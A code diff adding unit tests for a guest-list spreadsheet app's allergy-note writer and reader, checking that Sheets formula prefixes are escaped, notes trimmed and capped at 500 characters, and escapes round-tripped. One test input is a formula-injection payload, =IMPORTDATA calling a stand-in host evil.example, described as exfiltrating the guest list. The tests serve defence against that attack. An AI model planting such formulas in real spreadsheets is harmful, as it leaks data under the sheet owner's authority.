@@ -59,6 +59,41 @@ test("allergies round-trip through the default string", () => {
   assert.equal(writeAllergies("seafood"), "seafood");
 });
 
+test("writeAllergies neutralises every Sheets formula prefix", () => {
+  // A leading =, +, - or @ makes Range.setValue() store a live FORMULA, which
+  // would run with the sheet owner's authority (=IMPORTDATA exfiltrates the
+  // guest list; =A1:Z999 spills over the neighbouring summary formulas).
+  assert.equal(writeAllergies('=IMPORTDATA("https://evil.example/x")'), "'=IMPORTDATA(\"https://evil.example/x\")");
+  assert.equal(writeAllergies("-peanuts"), "'-peanuts");
+  assert.equal(writeAllergies("+shellfish"), "'+shellfish");
+  assert.equal(writeAllergies("@gluten"), "'@gluten");
+  assert.equal(writeAllergies("  =A1:Z999  "), "'=A1:Z999");
+});
+
+test("writeAllergies leaves ordinary text untouched", () => {
+  assert.equal(writeAllergies("seafood"), "seafood");
+  assert.equal(writeAllergies("  nuts, dairy  "), "nuts, dairy");
+  assert.equal(writeAllergies("no = sign at the start"), "no = sign at the start");
+});
+
+test("writeAllergies caps the note at 500 characters", () => {
+  const long = "a".repeat(600);
+  assert.equal(writeAllergies(long).length, 500);
+  assert.equal(writeAllergies(long), "a".repeat(500));
+  // Exactly 500 is kept whole.
+  assert.equal(writeAllergies("b".repeat(500)).length, 500);
+});
+
+test("the escaping apostrophe round-trips through readAllergies", () => {
+  ["-peanuts", "=nuts", "+dairy", "@soy"].forEach((note) => {
+    assert.equal(readAllergies(writeAllergies(note)), note);
+  });
+  // Only one apostrophe is stripped, so a note the guest actually typed with a
+  // quote is not eaten twice.
+  assert.equal(readAllergies("''-peanuts"), "'-peanuts");
+  assert.equal(readAllergies("seafood"), "seafood");
+});
+
 test("resolveHeaders finds columns by name and throws on a missing one", () => {
   const h = H();
   assert.equal(h.nombre, 1);
